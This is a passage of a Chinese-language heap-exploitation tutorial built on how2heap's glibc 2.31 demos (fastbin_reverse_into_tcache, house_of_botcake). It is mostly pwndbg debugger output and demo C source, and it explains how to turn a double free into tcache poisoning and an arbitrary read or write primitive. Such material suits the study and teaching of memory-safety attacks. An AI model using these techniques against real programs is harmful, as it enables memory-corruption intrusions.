class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  <span class="number">0x5555555596b0</span> —▸ <span class="number">0x555555559650</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x555555555570</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line">*RCX  <span class="number">0x7ffff7fb0ba8</span> (main_arena+<span class="number">40</span>) ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">*RDX  <span class="number">0x555555559016</span> ◂— <span class="number">0x7</span></span><br><span class="line">*RDI  <span class="number">0x6</span></span><br><span class="line">*RSI  <span class="number">0x0</span></span><br><span class="line">*R8   <span class="number">0x5555555596b0</span> —▸ <span class="number">0x555555559650</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R9   <span class="number">0x18</span></span><br><span class="line">*R10  <span class="number">0x555555559028</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0x555555555140</span> (_start) ◂— endbr64</span><br><span class="line"> R13  <span class="number">0x7fffffffe3a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffe2b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line">*RIP  <span class="number">0x55555555548c</span> (main+<span class="number">611</span>) ◂— mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x555555555473</span> &lt;main+<span class="number">586</span>&gt;    lea    rdi, [rip + <span class="number">0x108e</span>]</span><br><span class="line">   <span class="number">0x55555555547a</span> &lt;main+<span class="number">593</span>&gt;    call   <span class="built_in">puts</span>@plt &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55555555547f</span> &lt;main+<span class="number">598</span>&gt;    mov    eax, <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x555555555484</span> &lt;main+<span class="number">603</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x555555555487</span> &lt;main+<span class="number">606</span>&gt;    call   <span class="built_in">malloc</span>@plt &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x55555555548c</span> &lt;main+<span class="number">611</span>&gt;    mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">   <span class="number">0x555555555497</span> &lt;main+<span class="number">622</span>&gt;    jmp    main+<span class="number">694</span> &lt;main+<span class="number">694</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x5555555554df</span> &lt;main+<span class="number">694</span>&gt;    cmp    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">5</span></span><br><span class="line">   <span class="number">0x5555555554e7</span> &lt;main+<span class="number">702</span>&gt;    jbe    main+<span class="number">624</span> &lt;main+<span class="number">624</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x555555555499</span> &lt;main+<span class="number">624</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0xc8</span>]</span><br><span class="line">   <span class="number">0x5555555554a0</span> &lt;main+<span class="number">631</span>&gt;    mov    rax, qword ptr [rbp + rax*<span class="number">8</span> - <span class="number">0xb0</span>]</span><br><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">115</span>     <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">   <span class="number">116</span>   );</span><br><span class="line">   <span class="number">117</span></span><br><span class="line">   <span class="number">118</span>   <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">119</span></span><br><span class="line"> ► <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe1f8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe218</span> —▸ <span class="number">0x555555559010</span> ◂— <span class="number">0x7000000000000</span></span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555548</span>c main+<span class="number">611</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> —▸ <span class="number">0x555555559610</span> —▸ <span class="number">0x555555559660</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时，原本在fastbin 的chunk list 都被放到了 tcaceh bins 里</p><p>如果我们最后再malloc 一次，我们就能拿到栈的地址  （tcache  不检查size域）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> ► <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">126</span>     <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="number">127</span>     <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">   <span class="number">128</span>     q</span><br><span class="line">   <span class="number">129</span>   );</span><br><span class="line">   <span class="number">130</span></span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fffffffe1f8</span> —▸ <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rax r8  <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffffffe218</span> ◂— <span class="number">0x0</span></span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">5555555554f</span>d main+<span class="number">724</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p q</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7fffffffe210</span> <span class="string">&quot;ДUUUU&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这样我们可以达到一个任意地址写 或者读的原语（取决于下一步对 这分配出来的chunk进行什么样的操作）</p><p>完整代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><h3 id="3-house-of-bocake"><a href="#3-house-of-bocake" class="headerlink" title="3. house_of_bocake"></a>3. house_of_bocake</h3><p>一种 tcache poisoning attack ，通过一些手段，在tcachebins 中写入目标地址</p><p>构造如下情景：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed                <span class="number">0x0</span>              None</span><br><span class="line"><span class="number">0x5555555593a0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555592a0</span>              None</span><br><span class="line"><span class="number">0x5555555594b0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555593b0</span>              None</span><br><span class="line"><span class="number">0x5555555595c0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555594c0</span>              None</span><br><span class="line"><span class="number">0x5555555596d0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555595d0</span>              None</span><br><span class="line"><span class="number">0x5555555597e0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555596e0</span>              None</span><br><span class="line"><span class="number">0x5555555598f0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555597f0</span>              None</span><br><span class="line"><span class="number">0x555555559a00</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b10</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559c20</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>此时的 tcache 是被填满的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559900</span> —▸ <span class="number">0x5555555597f0</span> —▸ <span class="number">0x5555555596e0</span> —▸ <span class="number">0x5555555595d0</span> —▸ <span class="number">0x5555555594c0</span> —▸ <span class="number">0x5555555593b0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>然后我们free a 再 free prev ， 由于 prev 与  a 是相邻 chunk ，所以会触发合并，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">50</span>     &#125;</span><br><span class="line">   <span class="number">51</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">   <span class="number">52</span>     <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"> ► <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br></pre></td></tr></table></figure><p>触发合并后，在 unsortedbin 里的是 prev chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559a00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x555555559a00</span></span><br><span class="line"><span class="number">0x555555559a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000221</span>      ====== &gt; chunk prev</span><br><span class="line"><span class="number">0x555555559a10</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559aa0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ac0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559af0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span>        ====== &gt; chunk a</span><br><span class="line"><span class="number">0x555555559b20</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559b30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后我们要想办法把 chunk a 放入 tcache  bin里，由于此时 tcache bins 是满的，所以我们先取一个出来, 然后再 free 一次 a</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">   <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br><span class="line">   <span class="number">57</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line"> ► <span class="number">58</span>     <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="number">59</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">60</span>     <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">   <span class="number">61</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>     <span class="comment">// simple tcache poisoning</span></span><br></pre></td></tr></table></figure><p>此时 a chunk 就会被放入 tcahcebins 里，同时 prev 可以控制  chunk a 的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> —▸ <span class="number">0x5555555597f0</span> —▸ <span class="number">0x5555555596e0</span> —▸ <span class="number">0x5555555595d0</span> —▸ <span class="number">0x5555555594c0</span> —▸ <span class="number">0x5555555593b0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559a00</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x555555559b20</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>所以我们从此时的 unsortedbin 给他分一块出来，然后修改其 fd 的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 